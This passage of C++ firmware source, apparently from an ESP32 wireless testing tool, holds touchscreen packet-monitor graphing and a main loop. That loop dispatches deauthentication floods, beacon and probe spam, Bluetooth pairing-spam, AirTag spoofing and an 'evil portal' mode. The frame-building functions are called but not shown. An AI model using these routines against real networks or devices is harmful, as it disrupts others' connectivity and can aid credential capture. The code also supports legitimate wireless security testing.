              changeChannel();
              break;
            }
          }
          else if (b == 6) {
            Serial.println("Exiting packet monitor...");
            this->StartScan(WIFI_SCAN_OFF);
            //display_obj.tft.init();
            this->orient_display = true;
            return;
          }
        }
      }
  
      if (currentTime - initTime >= (GRAPH_REFRESH * 5)) {
        x_pos += x_scale;
        initTime = millis();
        y_pos_x = ((-num_eapol * (y_scale * 3)) + (HEIGHT_1 - 2)); // GREEN
        if (y_pos_x >= HEIGHT_1) {
          Serial.println("Max EAPOL number reached. Adjusting...");
          num_eapol = 0;
        }
  
        //CODE FOR PLOTTING CONTINUOUS LINES!!!!!!!!!!!!
        //Plot "X" value
        display_obj.tft.drawLine(x_pos - x_scale, y_pos_x_old, x_pos, y_pos_x, TFT_CYAN);
  
        //Draw preceding black 'boxes' to erase old plot lines, !!!WEIRD CODE TO COMPENSATE FOR BUTTONS AND COLOR KEY SO 'ERASER' DOESN'T ERASE BUTTONS AND COLOR KEY!!!
        if ((x_pos <= 90) || ((x_pos >= 117) && (x_pos <= 320))) //above x axis
        {
          display_obj.tft.fillRect(x_pos+1, 28, 10, 93, TFT_BLACK); //compensate for buttons!
        }
        else
        {
          display_obj.tft.fillRect(x_pos+1, 0, 10, 121, TFT_BLACK); //don't compensate for buttons!
        }
        if (x_pos < 0) // below x axis
        {
          //tft.fillRect(x_pos+1, 121, 10, 88, TFT_BLACK);
          display_obj.tft.fillRect(x_pos+1, 121, 10, 88, TFT_CYAN);
        }
        else
        {
          //tft.fillRect(x_pos+1, 121, 10, 119, TFT_BLACK);
          display_obj.tft.fillRect(x_pos+1, 121, 10, 118, TFT_BLACK);
        }
  
        //tftDisplayTime();
  
        if ( (y_pos_x == 120) || (y_pos_y == 120) || (y_pos_z == 120) )
        {
          display_obj.tft.drawFastHLine(10, 120, 310, TFT_WHITE); // x axis
        }
  
        y_pos_x_old = y_pos_x; //set old y pos values to current y pos values 
        //y_pos_y_old = y_pos_y;
        //y_pos_z_old = y_pos_z;
  
        //delay(50);
      }
  
      #ifdef HAS_SD
        sd_obj.main();
      #endif
  
    }
  
    display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK); //erase XY buttons and any lines behind them
    display_obj.tft.fillRect(12, 0, 90, 32, TFT_BLACK); // key
    display_obj.tftDrawChannelScaleButtons(set_channel);
    display_obj.tftDrawExitScaleButtons();
    display_obj.tftDrawEapolColorKey();
    display_obj.tftDrawGraphObjects(x_scale);
  }

  void WiFiScan::packetMonitorMain(uint32_t currentTime)
  {
    //---------MAIN 'FOR' LOOP! THIS IS WHERE ALL THE ACTION HAPPENS! HAS TO BE FAST!!!!!---------\\
    
    
  //  for (x_pos = (11 + x_scale); x_pos <= 320; x_pos += x_scale) //go along every point on the x axis and do something, start over when finished
    for (x_pos = (11 + x_scale); x_pos <= 320; x_pos = x_pos)
    {
      currentTime = millis();
      do_break = false;
      
      y_pos_x = 0;
      y_pos_y = 0;
      y_pos_z = 0;
      boolean pressed = false;
      
      uint16_t t_x = 0, t_y = 0; // To store the touch coordinates
  
      // Do the touch stuff
      #ifdef HAS_ILI9341
        pressed = display_obj.tft.getTouch(&t_x, &t_y);
      #endif
  
      if (pressed) {
        Serial.print("Got touch | X: ");
        Serial.print(t_x);
        Serial.print(" Y: ");
        Serial.println(t_y);
      }
  
  
      // Check buttons for presses
      for (uint8_t b = 0; b < BUTTON_ARRAY_LEN; b++)
      {
        if (pressed && display_obj.key[b].contains(t_x, t_y))
        {
          display_obj.key[b].press(true);
        } else {
          display_obj.key[b].press(false);
        }
      }
      
      // Which buttons pressed
      for (uint8_t b = 0; b < BUTTON_ARRAY_LEN; b++)
      {
        if (display_obj.key[b].justPressed())
        {
          Serial.println("Bro, key pressed");
          //do_break = true;
        }
  
        if (display_obj.key[b].justReleased())
        {
          do_break = true;
          
          // X - button pressed
          if (b == 0) {
            if (x_scale > 1) {
              x_scale--;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawXScaleButtons(x_scale);
              display_obj.tftDrawYScaleButtons(y_scale);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              break;
            }
          }
          // X + button pressed
          else if (b == 1) {
            if (x_scale < 6) {
              x_scale++;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawXScaleButtons(x_scale);
              display_obj.tftDrawYScaleButtons(y_scale);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              break;
            }
          }
  
          // Y - button pressed
          else if (b == 2) {
            if (y_scale > 1) {
              y_scale--;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawXScaleButtons(x_scale);
              display_obj.tftDrawYScaleButtons(y_scale);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              //updateMidway();
              break;
            }
          }
  
          // Y + button pressed
          else if (b == 3) {
            if (y_scale < 9) {
              y_scale++;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawXScaleButtons(x_scale);
              display_obj.tftDrawYScaleButtons(y_scale);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              //updateMidway();
              break;
            }
          }
  
          // Channel - button pressed
          else if (b == 4) {
            if (set_channel > 1) {
              Serial.println("Shit channel down");
              set_channel--;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawXScaleButtons(x_scale);
              display_obj.tftDrawYScaleButtons(y_scale);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              changeChannel();
              break;
            }
          }
  
          // Channel + button pressed
          else if (b == 5) {
            if (set_channel < MAX_CHANNEL) {
              Serial.println("Shit channel up");
              set_channel++;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawXScaleButtons(x_scale);
              display_obj.tftDrawYScaleButtons(y_scale);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              changeChannel();
              break;
            }
          }
          else if (b == 6) {
            Serial.println("Exiting packet monitor...");
            this->StartScan(WIFI_SCAN_OFF);
            //display_obj.tft.init();
            this->orient_display = true;
            return;
          }
        }
      }
  
      if (currentTime - initTime >= GRAPH_REFRESH) {
        //Serial.println("-----------------------------------------");
        //Serial.println("Time elapsed: " + (String)(currentTime - initTime) + "ms");
        x_pos += x_scale;
        initTime = millis();
        y_pos_x = ((-num_beacon * (y_scale * 3)) + (HEIGHT_1 - 2)); // GREEN
        y_pos_y = ((-num_deauth * (y_scale * 3)) + (HEIGHT_1 - 2)); // RED
        y_pos_z = ((-num_probe * (y_scale * 3)) + (HEIGHT_1 - 2)); // BLUE
  
        //Serial.println("num_beacon: " + (String)num_beacon);
        //Serial.println("num_deauth: " + (String)num_deauth);
        //Serial.println(" num_probe: " + (String)num_probe);
    
        num_beacon = 0;
        num_probe = 0;
        num_deauth = 0;
        
        //CODE FOR PLOTTING CONTINUOUS LINES!!!!!!!!!!!!
        //Plot "X" value
        display_obj.tft.drawLine(x_pos - x_scale, y_pos_x_old, x_pos, y_pos_x, TFT_GREEN);
        //Plot "Z" value
        display_obj.tft.drawLine(x_pos - x_scale, y_pos_z_old, x_pos, y_pos_z, TFT_BLUE);
        //Plot "Y" value
        display_obj.tft.drawLine(x_pos - x_scale, y_pos_y_old, x_pos, y_pos_y, TFT_RED);
        
        //Draw preceding black 'boxes' to erase old plot lines, !!!WEIRD CODE TO COMPENSATE FOR BUTTONS AND COLOR KEY SO 'ERASER' DOESN'T ERASE BUTTONS AND COLOR KEY!!!
        //if ((x_pos <= 90) || ((x_pos >= 198) && (x_pos <= 320))) //above x axis
        if ((x_pos <= 90) || ((x_pos >= 117) && (x_pos <= 320))) //above x axis
        {
          display_obj.tft.fillRect(x_pos+1, 28, 10, 93, TFT_BLACK); //compensate for buttons!
        }
        else
        {
          display_obj.tft.fillRect(x_pos+1, 0, 10, 121, TFT_BLACK); //don't compensate for buttons!
        }
        //if ((x_pos >= 254) && (x_pos <= 320)) //below x axis
        //if (x_pos <= 90)
        if (x_pos < 0) // below x axis
        {
          //tft.fillRect(x_pos+1, 121, 10, 88, TFT_BLACK);
          display_obj.tft.fillRect(x_pos+1, 121, 10, 88, TFT_CYAN);
        }
        else
        {
          //tft.fillRect(x_pos+1, 121, 10, 119, TFT_BLACK);
          display_obj.tft.fillRect(x_pos+1, 121, 10, 118, TFT_BLACK);
        }
        
        //tftDisplayTime();
        
        if ( (y_pos_x == 120) || (y_pos_y == 120) || (y_pos_z == 120) )
        {
          display_obj.tft.drawFastHLine(10, 120, 310, TFT_WHITE); // x axis
        }
         
        y_pos_x_old = y_pos_x; //set old y pos values to current y pos values 
        y_pos_y_old = y_pos_y;
        y_pos_z_old = y_pos_z;
    
        //delay(50);
      }
  
      #ifdef HAS_SD
        sd_obj.main();
      #endif
     
    }
    
    display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK); //erase XY buttons and any lines behind them
    //tft.fillRect(56, 0, 66, 32, TFT_ORANGE); //erase time and color key and any stray lines behind them
    display_obj.tft.fillRect(12, 0, 90, 32, TFT_BLACK); // key
    
    display_obj.tftDrawXScaleButtons(x_scale); //redraw stuff
    display_obj.tftDrawYScaleButtons(y_scale);
    display_obj.tftDrawChannelScaleButtons(set_channel);
    display_obj.tftDrawExitScaleButtons();
    display_obj.tftDrawColorKey();
    display_obj.tftDrawGraphObjects(x_scale);
  }
#endif

//void WiFiScan::sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
//  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
//  showMetadata(snifferPacket, type);
//}

void WiFiScan::changeChannel(int chan) {
  this->set_channel = chan;
  esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);
}

void WiFiScan::changeChannel()
{
  esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);
}

// Function to cycle to the next channel
void WiFiScan::channelHop()
{
  this->set_channel = this->set_channel + 1;
  if (this->set_channel > 13) {
    this->set_channel = 1;
  }
  esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);
}

char* WiFiScan::stringToChar(String string) {
  char buf[string.length() + 1] = {};
  string.toCharArray(buf, string.length() + 1);

  return buf;
}


// Function for updating scan status
void WiFiScan::main(uint32_t currentTime)
{
  // WiFi operations
  if ((currentScanMode == WIFI_SCAN_PROBE) ||
  (currentScanMode == WIFI_SCAN_AP) ||
  (currentScanMode == WIFI_SCAN_STATION) ||
  (currentScanMode == WIFI_SCAN_SIG_STREN) ||
  (currentScanMode == WIFI_SCAN_TARGET_AP) ||
  (currentScanMode == WIFI_SCAN_PWN) ||
  (currentScanMode == WIFI_SCAN_DEAUTH) ||
  (currentScanMode == WIFI_SCAN_STATION_WAR_DRIVE) ||
  (currentScanMode == WIFI_SCAN_ALL))
  {
    if (currentTime - initTime >= this->channel_hop_delay * 1000)
    {
      initTime = millis();
      channelHop();
    }
  }
  else if ((currentScanMode == BT_ATTACK_SWIFTPAIR_SPAM) ||
           (currentScanMode == BT_ATTACK_SOUR_APPLE) ||
           (currentScanMode == BT_ATTACK_SPAM_ALL) ||
           (currentScanMode == BT_ATTACK_SAMSUNG_SPAM) ||
           (currentScanMode == BT_ATTACK_GOOGLE_SPAM) ||
           (currentScanMode == BT_ATTACK_FLIPPER_SPAM) ||
           (currentScanMode == BT_SPOOF_AIRTAG)) {
    #ifdef HAS_BT
      if (currentTime - initTime >= 1000) {
        initTime = millis();
        String displayString = "";
        String displayString2 = "";
        displayString.concat("Advertising Data...");
        for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
          displayString2.concat(" ");
        #ifdef HAS_SCREEN
          display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
          display_obj.showCenterText(displayString2, TFT_HEIGHT / 2);
          display_obj.showCenterText(displayString, TFT_HEIGHT / 2);
        #endif
      }

      if ((currentScanMode == BT_ATTACK_GOOGLE_SPAM) ||
          (currentScanMode == BT_ATTACK_SPAM_ALL))
        this->executeSwiftpairSpam(Google);

      if ((currentScanMode == BT_ATTACK_SAMSUNG_SPAM) ||
          (currentScanMode == BT_ATTACK_SPAM_ALL))
        this->executeSwiftpairSpam(Samsung);

      if ((currentScanMode == BT_ATTACK_SWIFTPAIR_SPAM) ||
          (currentScanMode == BT_ATTACK_SPAM_ALL))
        this->executeSwiftpairSpam(Microsoft);
        //this->executeSwiftpairSpam(FlipperZero);

      if ((currentScanMode == BT_ATTACK_SOUR_APPLE) ||
          (currentScanMode == BT_ATTACK_SPAM_ALL))
        this->executeSourApple();

      if ((currentScanMode == BT_ATTACK_FLIPPER_SPAM) ||
          (currentScanMode == BT_ATTACK_SPAM_ALL))
        this->executeSwiftpairSpam(FlipperZero);
      
      if (currentScanMode == BT_SPOOF_AIRTAG)
        this->executeSpoofAirtag();

    #endif
  }
  else if (currentScanMode == WIFI_SCAN_WAR_DRIVE) {
    if (currentTime - initTime >= this->channel_hop_delay * 1000)
    {
      initTime = millis();
      #ifdef HAS_GPS
        if (gps_obj.getGpsModuleStatus())
          this->executeWarDrive();
      #endif
    }
  }
  else if (currentScanMode == WIFI_SCAN_GPS_DATA) {
    if (currentTime - initTime >= 5000) {
      this->initTime = millis();
      this->RunGPSInfo();
    }
  }
  else if (currentScanMode == WIFI_SCAN_GPS_NMEA) {
    if (currentTime - initTime >= 1000) {
      this->initTime = millis();
      this->RunGPSNmea();
    }
  }
  else if (currentScanMode == WIFI_SCAN_EVIL_PORTAL) {
    evil_portal_obj.main(currentScanMode);
  }
  else if (currentScanMode == WIFI_PACKET_MONITOR)
  {
    #ifdef HAS_SCREEN
      #ifdef HAS_ILI9341
        packetMonitorMain(currentTime);
      #endif
    #endif
  }
  else if (currentScanMode == WIFI_SCAN_EAPOL)
  {
    #ifdef HAS_SCREEN
      #ifdef HAS_ILI9341
        eapolMonitorMain(currentTime);
      #endif
    #endif
  }
  else if (currentScanMode == WIFI_SCAN_ACTIVE_EAPOL)
  {
    #ifdef HAS_SCREEN
      eapolMonitorMain(currentTime);
    #endif
  }
  else if (currentScanMode == WIFI_SCAN_ACTIVE_LIST_EAPOL) {
    if (currentTime - initTime >= this->channel_hop_delay * 1000)
    {
      initTime = millis();
      channelHop();
    }
    #ifdef HAS_SCREEN
      eapolMonitorMain(currentTime);
    #endif    
  }
  else if (currentScanMode == WIFI_ATTACK_AUTH) {
    for (int i = 0; i < 55; i++)
      this->sendProbeAttack(currentTime);

    if (currentTime - initTime >= 1000) {
      initTime = millis();
      String displayString = "";
      String displayString2 = "";
      displayString.concat(text18);
      displayString.concat(packets_sent);
      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
        displayString2.concat(" ");
      #ifdef HAS_SCREEN
        display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
        display_obj.showCenterText(displayString2, TFT_HEIGHT / 2);
        display_obj.showCenterText(displayString, TFT_HEIGHT / 2);
      #endif
      packets_sent = 0;
    }
  }
  else if (currentScanMode == WIFI_ATTACK_DEAUTH) {
    for (int i = 0; i < 55; i++)
      this->sendDeauthAttack(currentTime, this->dst_mac);

    if (currentTime - initTime >= 1000) {
      initTime = millis();
      String displayString = "";
      String displayString2 = "";
      displayString.concat(text18);
      displayString.concat(packets_sent);
      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
        displayString2.concat(" ");
      #ifdef HAS_SCREEN
        display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
        display_obj.showCenterText(displayString2, TFT_HEIGHT / 2);
        display_obj.showCenterText(displayString, TFT_HEIGHT / 2);
      #endif
      packets_sent = 0;
    }
  }
  else if (currentScanMode == WIFI_ATTACK_DEAUTH_MANUAL) {
    for (int i = 0; i < 55; i++)
      this->sendDeauthFrame(this->src_mac, this->set_channel, this->dst_mac);

    if (currentTime - initTime >= 1000) {
      initTime = millis();
      String displayString = "";
      String displayString2 = "";
      displayString.concat(text18);
      displayString.concat(packets_sent);
      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
        displayString2.concat(" ");
      #ifdef HAS_SCREEN
        display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
        display_obj.showCenterText(displayString2, TFT_HEIGHT / 2);
        display_obj.showCenterText(displayString, TFT_HEIGHT / 2);
      #endif
      packets_sent = 0;
    }
  }
  else if (currentScanMode == WIFI_ATTACK_DEAUTH_TARGETED) {
    // Loop through each AP
    for (int x = 0; x < access_points->size(); x++) {
      // Only get selected APs
      if (access_points->get(x).selected) {
        AccessPoint cur_ap = access_points->get(x);
        // Loop through each AP's Station
        for (int i = 0; i < cur_ap.stations->size(); i++) {
          // Only get selected Stations
          if (stations->get(cur_ap.stations->get(i)).selected) {
            Station cur_sta = stations->get(cur_ap.stations->get(i));

            // Send deauths for each selected AP's selected Station
            for (int y = 0; y < 25; y++)
              this->sendDeauthFrame(cur_ap.bssid, cur_ap.channel, cur_sta.mac);

            // Display packets sent on screen
            if (currentTime - initTime >= 1000) {
              initTime = millis();
              String displayString = "";
              String displayString2 = "";
              displayString.concat(text18);
              displayString.concat(packets_sent);
              for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
                displayString2.concat(" ");
              #ifdef HAS_SCREEN
                display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
                display_obj.showCenterText(displayString2, TFT_HEIGHT / 2);
                display_obj.showCenterText(displayString, TFT_HEIGHT / 2);
              #endif
              packets_sent = 0;
            }
          }
        }
      }
    }
  }
  else if ((currentScanMode == WIFI_ATTACK_MIMIC)) {
    // Need this for loop because getTouch causes ~10ms delay
    // which makes beacon spam less effective
    for (int i = 0; i < access_points->size(); i++) {
      if (access_points->get(i).selected)
        this->broadcastCustomBeacon(currentTime, ssid{access_points->get(i).essid, random(1, 12), {random(256), 
                                                                                                   random(256),
                                                                                                   random(256),
                                                                                                   random(256),
                                                                                                   random(256),
                                                                                                   random(256)}});
    }
      

    if (currentTime - initTime >= 1000)
    {
      initTime = millis();
      //Serial.print("packets/sec: ");
      //Serial.println(packets_sent);
      String displayString = "";
      String displayString2 = "";
      displayString.concat(text18);
      displayString.concat(packets_sent);
      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
        displayString2.concat(" ");
      #ifdef HAS_SCREEN
        display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
        display_obj.showCenterText(displayString2, TFT_HEIGHT / 2);
        display_obj.showCenterText(displayString, TFT_HEIGHT / 2);
      #endif
      packets_sent = 0;
    }
  }
  else if ((currentScanMode == WIFI_ATTACK_BEACON_SPAM))
  {
    // Need this for loop because getTouch causes ~10ms delay
    // which makes beacon spam less effective
    for (int i = 0; i < 55; i++)
      broadcastRandomSSID(currentTime);

    if (currentTime - initTime >= 1000)
    {
      initTime = millis();
      //Serial.print("packets/sec: ");
      //Serial.println(packets_sent);
      String displayString = "";
      String displayString2 = "";
      displayString.concat(text18);
      displayString.concat(packets_sent);
      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
        displayString2.concat(" ");
      #ifdef HAS_SCREEN
        display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
        display_obj.showCenterText(displayString2, TFT_HEIGHT / 2);
        display_obj.showCenterText(displayString, TFT_HEIGHT / 2);
      #endif
      packets_sent = 0;
    }
  }
  else if ((currentScanMode == WIFI_ATTACK_BEACON_LIST)) {
    for (int i = 0; i < ssids->size(); i++)
      this->broadcastCustomBeacon(currentTime, ssids->get(i));

    if (currentTime - initTime >= 1000)
    {
      initTime = millis();
      String displayString = "";
      String displayString2 = "";
      displayString.concat(text18);
      displayString.concat(packets_sent);
      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
        displayString2.concat(" ");
      #ifdef HAS_SCREEN
        display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
        display_obj.showCenterText(displayString2, TFT_HEIGHT / 2);
        display_obj.showCenterText(displayString, TFT_HEIGHT / 2);
      #endif
      packets_sent = 0;
    }
  }
  else if ((currentScanMode == WIFI_ATTACK_AP_SPAM)) {
    for (int i = 0; i < access_points->size(); i++) {
      if (access_points->get(i).selected)
        this->broadcastCustomBeacon(currentTime, access_points->get(i));
    }

    if (currentTime - initTime >= 1000) {
      initTime = millis();
      packets_sent = 0;
    }
  }
  else if ((currentScanMode == WIFI_ATTACK_RICK_ROLL))
  {
    // Need this for loop because getTouch causes ~10ms delay
    // which makes beacon spam less effective
    for (int i = 0; i < 7; i++)
    {
      for (int x = 0; x < (sizeof(rick_roll)/sizeof(char *)); x++)
      {
        broadcastSetSSID(currentTime, rick_roll[x]);
      }
    }

    if (currentTime - initTime >= 1000)
    {
      initTime = millis();
      //Serial.print("packets/sec: ");
      //Serial.println(packets_sent);
      String displayString = "";
      String displayString2 = "";
      displayString.concat(text18);
      displayString.concat(packets_sent);
      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
        displayString2.concat(" ");
      #ifdef HAS_SCREEN
        display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
        display_obj.showCenterText(displayString2, TFT_HEIGHT / 2);
        display_obj.showCenterText(displayString, TFT_HEIGHT / 2);
      #endif
      packets_sent = 0;
    }
  }
  #ifdef HAS_GPS
    else if ((currentScanMode == WIFI_SCAN_OFF))
      if(gps_obj.queue_enabled())
        gps_obj.disable_queue();
  #endif
}
